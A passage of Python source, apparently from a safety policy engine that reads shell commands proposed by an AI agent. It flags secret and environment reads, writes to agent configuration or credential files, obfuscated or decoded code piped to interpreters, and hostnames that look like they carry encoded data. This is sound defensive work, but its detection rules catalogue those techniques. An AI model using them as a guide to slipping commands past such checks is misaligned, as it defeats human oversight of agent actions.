        if name == "npm" and sub == "init" and len(_positional(words)) > 1:
            return "'npm init <package>'"
    if program == "uv":
        positional = [word.lower() for word in _positional(words)]
        if positional[:2] in (["pip", "install"], ["tool", "install"], ["tool", "run"]) or positional[:1] == ["add"]:
            return f"'uv {' '.join(positional[:2])}'"
    if program in _INTERPRETERS and any(other.program in _DOWNLOADERS for other in earlier):
        return f"a download piped to '{program}'"
    return None


def _spellings(word: str) -> Iterator[str]:
    """A word, and what a file check must also see in it: its comma-separated parts (a PowerShell list,
    'a','b') and the plain form of a path written in a roundabout way (.claude/./settings.json)."""
    yield word
    parts = [part for part in word.split(",") if part] if "," in word else [word]
    for part in parts:
        if part is not word:
            yield part
        if _ROUNDABOUT_PATH.search(part):
            yield posixpath.normpath(part.replace("\\", "/"))


def _named_files(command: _Command) -> Iterator[str]:
    """Every word of a command that may name a file it reads: the program's own word, its words, its
    redirections and the words of its PowerShell groups."""
    for word in (command.written, *command.words, *command.targets, *command.groups):
        yield from _spellings(word)


def _secret_read(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    for word in _named_files(command):
        if _SECRET_WORD.search(word):
            return f"word '{word}'"
    positional = _positional(words)
    if program == "printenv":
        return "program 'printenv'"
    if program == "env" and not [word for word in positional if not _ASSIGNMENT.match(word)]:
        return "program 'env' with no command"
    if program == "set" and command.shell == "bash" and not words:
        return "program 'set' with no arguments"
    if program == "export" and all(word == "-p" for word in words):
        return "program 'export' with no names"
    if program in ("declare", "typeset") and words and not positional and all(
            set(word[1:]) <= set("px") for word in words):
        return f"program '{program}' listing variables"
    if program in _ENV_LISTERS and any(word.lower().startswith("env:") for word in words):
        return f"program '{program}' with env:"
    if command.shell == "powershell" and any(_DOTNET_ENVIRONMENT.search(word) for word in (program, *words)):
        return "[Environment]::GetEnvironmentVariables"
    return None


def _protected(word: str) -> bool:
    """True if a word a command writes to names an agent's configuration, a credential file or $PROFILE."""
    return any(_PROTECTED_TARGET.search(spelling) or _PROFILE_VARIABLE.match(spelling)
               for spelling in _spellings(word))


def _write_targets(words: Iterable[str]) -> Iterator[str]:
    """The words a writing program may write to: those that are not options, and the values of options
    written with them (--target-directory=x, -Destination:x)."""
    for word in words:
        if word.startswith("-") and word != "-":
            value = re.split(r"[=:]", word, maxsplit=1)[1:]
            if value and value[0]:
                yield value[0]
        else:
            yield word


def _config_write(command: _Command, earlier: list[_Command]) -> str | None:
    for target in command.targets:
        if _protected(target):
            return f"a redirection to '{target}'"
    program, words = command.program, command.words
    writes = program in _PROGRAM_WRITERS or (
        program in _IN_PLACE_EDITORS and any(word.startswith(("-i", "--in-place", "-pi")) for word in words)) or (
        program == "tar" and _tar_extracts(words)) or (
        command.shell == "powershell" and any(_DOTNET_WRITE.search(word) for word in (command.written, *words)))
    if writes:
        for word in (*_write_targets(words), *command.groups):
            if _protected(word):
                return f"program '{program or command.written}' with '{word}'"
    return None


def _obfuscation(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    if program == "eval":
        return "program 'eval'"
    if program in ("iex", "invoke-expression"):
        return f"program '{program}'"
    if program in _POWERSHELLS:
        for word in words:
            if word and word[0] in _DASHES + "/" and _encoded_command_option(word.lstrip(_DASHES + "/").lower()):
                return f"program '{program}' with {word}"
    call = _shell_call(program, list(words))
    if call is not None:
        texts = [text for text, _ in call.texts]
        if any(_SUBST in text for text in texts) or program in _POSIX_SHELLS and any(
                "$(" in text or "`" in text for text in texts):
            return f"program '{program}' with a command substitution in the command it runs"
        if call.stdin and command.position > 0:
            return f"text piped into '{program}', which runs it"
        if command.fed is not None and (call.missing or command.fed and any(command.fed in text for text in texts)):
            return f"text from its input run by '{program}' (xargs or parallel)"
    if command.position > 0 and (_language_reads_input(command) or program == "parallel"):
        return f"text piped into '{program}', which runs it"
    if _script_of(command) == _SUBST:
        return f"program '{program}' runs a command's output as its script"
    if program in _INTERPRETERS and any(_decodes(other) for other in earlier):
        return f"decoded text piped to '{program}'"
    if command.shell == "powershell" and any(_DOTNET_DECODE.search(word) for word in (program, *words)):
        return "[Convert]::FromBase64String"
    return None


# Languages that run code given inline (python -c, node -e, perl -ne ...), a script file, or their input.
_INLINE_CODE_OPTIONS = {
    "node": re.compile(r"-[ep]+|--(eval|print)(=.*)?", re.DOTALL),
    "perl": re.compile(r"-[A-Za-z]*[eE]"),
    "ruby": re.compile(r"-[A-Za-z]*e"),
    "php": re.compile(r"-[A-Za-z]*[rBRE]"),
    "lua": re.compile(r"-e"),
}
_INLINE_CODE_OPTIONS["nodejs"] = _INLINE_CODE_OPTIONS["node"]
_INLINE_CODE_OPTIONS["luajit"] = _INLINE_CODE_OPTIONS["lua"]


def _language_reads_input(command: _Command) -> bool:
    """True if a language interpreter takes the code it runs from its standard input (echo 'x' | python)."""
    program, words = command.program, list(command.words)
    if _PYTHONS.fullmatch(program):
        return _python_source(words)[0] == "stdin"
    inline = _INLINE_CODE_OPTIONS.get(program)
    if inline is None:
        return program in ("deno", "bun", "source", ".") and any(word in _STDIN_NAMES for word in words)
    for word in words:
        if word in _STDIN_NAMES:
            return True
        if not word.startswith("-") or inline.fullmatch(word):
            return False  # a script file, or code given inline
    return True


def _python_source(words: list[str]) -> tuple[str, str | None]:
    """Where python takes the code it runs: "inline" (-c), "module" (-m), "file" (with the file) or "stdin"."""
    i, n = 0, len(words)
    while i < n:
        word = words[i]
        if word in _STDIN_NAMES:
            return "stdin", None
        if word == "--":
            i += 1
            break
        if not word.startswith("-"):
            return "file", word
        i += 1
        if word.startswith("--"):
            i += 1 if word == "--check-hash-based-pycs" else 0
            continue
        letters = word[1:]
        for at, letter in enumerate(letters):
            if letter == "c":
                return "inline", None
            if letter == "m":
                return "module", None
            if letter in "WX":
                i += 1 if at + 1 == len(letters) else 0  # -W ignore, or -Wignore
                break
    if i < n and words[i] not in _STDIN_NAMES:
        return "file", words[i]
    return "stdin", None


def _script_of(command: _Command) -> str | None:
    """The script file a shell or an interpreter runs (bash -o pipefail x.sh, python -X dev x.py), if any."""
    call = _shell_call(command.program, list(command.words))
    if call is not None:
        return call.script
    if _PYTHONS.fullmatch(command.program):
        return _python_source(list(command.words))[1]
    if command.program in _INTERPRETERS:
        first = _positional(command.words)[:1]
        return first[0] if first else None
    return None


def _tar_extracts(words: Iterable[str]) -> bool:
    """tar -xf, tar xzf, tar --extract: tar writes the archive's files (into the folder after -C)."""
    words = list(words)
    if any(word in ("--extract", "--get") for word in words):
        return True
    return any(re.fullmatch(r"-[A-Za-z]*x[A-Za-z]*", word) for word in words) or bool(
        words and re.fullmatch(r"[A-Za-z]*x[A-Za-z]*", words[0]))


def _decodes(command: _Command) -> bool:
    """base64 -d, openssl base64 -d, xxd -r, certutil -decode: text turned back into what it hid."""
    words = [word.lower() for word in command.words]
    if command.program == "base64":
        return any(word in ("-d", "--decode", "-D") or re.fullmatch(r"-[a-z]*d[a-z]*", word) for word in words)
    if command.program == "openssl":
        return "-d" in words
    if command.program == "xxd":
        return any(word.startswith("-r") for word in words)
    if command.program == "certutil":
        return any(word.lstrip("-/") in ("decode", "decodehex") for word in words)
    return False


def _encoded_host(command: _Command) -> str | None:
    """A host name in a network command's words that looks like it carries data."""
    for word in (*command.words, *command.targets):
        if word.startswith("-"):
            word = word.partition("=")[2]
            if not word:
                continue
        socket = _DEV_SOCKET.search(word)
        found = _URL_HOST.match(word)
        host = socket.group(1) if socket else found.group(1) if found else None
        if host is None:
            bare = _BARE_HOST.fullmatch(word)
            host = bare.group(1) if bare else None
        if not host:
            continue
        for label in host.lower().split("."):
            why = _encoded_label(label)
            if why:
                return f"host '{host}': {why}"
    return None


def _encoded_label(label: str) -> str | None:
    if _SUBST in label:
        return "a label built from a command's output"
    if len(label) >= _LONG_LABEL:
        return f"a label of {len(label)} characters"
    has_digit = any(ch.isdigit() for ch in label)
    has_letter = any(ch.isalpha() for ch in label)
    if has_digit and has_letter and (_HEX_LABEL.fullmatch(label) or _BASE32_LABEL.fullmatch(label)):
        return "a label that looks like hex or base32"
    return None


# ---- the policy's "command" section ------------------------------------------------------------

@dataclass(frozen=True)
class CommandRule:
    """A tool rule's "command" section: how the classes of its command argument are treated.

    {"arg": "command", "shell": "bash", "deny_classes": ["obfuscation"], "ask_classes": ["network"],
     "allow_programs": ["git push"], "labels_by_class": {"network": ["sink"]}, "unreadable": "ask"}

    deny_classes     a command in one of these classes is refused
    ask_classes      ... is sent to a person for approval
    allow_programs   "curl" or "git push": a simple command whose program (and first words) match
                     is not counted as network or install (the word classes still count)
    labels_by_class  flow labels the call gets when its command is in the class; an unreadable
                     command gets all of them
    unreadable       "ask" (the default) or "block": what happens to a command that cannot be read,
                     when deny_classes or ask_classes name any class
    """

    arg: str = "command"
    shell: str = "bash"
    deny_classes: tuple[str, ...] = ()
    ask_classes: tuple[str, ...] = ()
    allow_programs: tuple[tuple[str, ...], ...] = ()
    labels_by_class: tuple[tuple[str, tuple[str, ...]], ...] = ()
    unreadable: str = "ask"

    def __post_init__(self) -> None:
        if self.shell not in SHELLS:
            raise ValueError(f"shell must be one of {SHELLS}")
        if self.unreadable not in ("ask", "block"):
            raise ValueError("unreadable must be 'ask' or 'block'")
        for kind in (*self.deny_classes, *self.ask_classes, *(kind for kind, _ in self.labels_by_class)):
            if kind not in CLASSES:
                raise ValueError(f"unknown command class {kind!r}")

    @property
    def judges(self) -> bool:
        """True if some class is refused or asked about (then an unreadable command is too)."""
        return bool(self.deny_classes or self.ask_classes)

    def reading(self, args: Any) -> Reading:
        """The reading of the command argument (its name compared ignoring case, as deny_args do)."""
        if not isinstance(args, dict):
            return Reading(unreadable="the arguments are not an object")
        wanted = self.arg.casefold()
        values = [value for name, value in args.items() if isinstance(name, str) and name.casefold() == wanted]
        if len(values) != 1:
            return Reading(unreadable="the command argument is missing" if not values else
                           "the command argument is given twice")
        return read_command(values[0], self.shell)

    def found(self, reading: Reading) -> dict[str, Finding]:
        """The classes of a reading, after allow_programs: class -> its first finding."""
        kinds: dict[str, Finding] = {}
        for finding in reading.findings:
            if finding.kind in kinds:
                continue
            if finding.kind in PROGRAM_CLASSES and self._allowed_program(finding):
                continue
            kinds[finding.kind] = finding
        return kinds

    def _allowed_program(self, finding: Finding) -> bool:
        for entry in self.allow_programs:
            if entry[0] == finding.program and tuple(finding.words[:len(entry) - 1]) == entry[1:]:
                return True
        return False

    def labels(self, args: Any) -> frozenset[str]:
        """The flow labels a call with these arguments gets from labels_by_class."""
        if not self.labels_by_class:
            return frozenset()
        reading = self.reading(args)
        if reading.unreadable is not None:
            return frozenset(label for _, labels in self.labels_by_class for label in labels)
        kinds = self.found(reading)
        return frozenset(label for kind, labels in self.labels_by_class if kind in kinds for label in labels)

    def describe(self) -> str:
        """What this section checks, for the operator."""
        parts = []
        if self.deny_classes:
            parts.append(f"refuses {', '.join(self.deny_classes)}")
        if self.ask_classes:
            parts.append(f"asks for {', '.join(self.ask_classes)}")
        if self.judges:
            parts.append(f"an unreadable command: {self.unreadable}")
        if self.allow_programs:
            parts.append(f"except programs {', '.join(' '.join(entry) for entry in self.allow_programs)}")
        if self.labels_by_class:
            parts.append("labels " + "; ".join(f"{kind}: {', '.join(labels)}" for kind, labels in self.labels_by_class))
        return f"{self.shell} command in argument '{self.arg}': " + ("; ".join(parts) or "read only")


def allow_program_entry(text: str) -> tuple[str, ...] | None:
    """An allow_programs entry ("git push") as words, the program normalised; None if it is not usable."""
    words = text.split()
    if not words or len(words) > 8 or any(ch in text for ch in "\"'`$\\;|&<>()"):
        return None
    return (_program_name(words[0]), *(word.lower() for word in words[1:]))
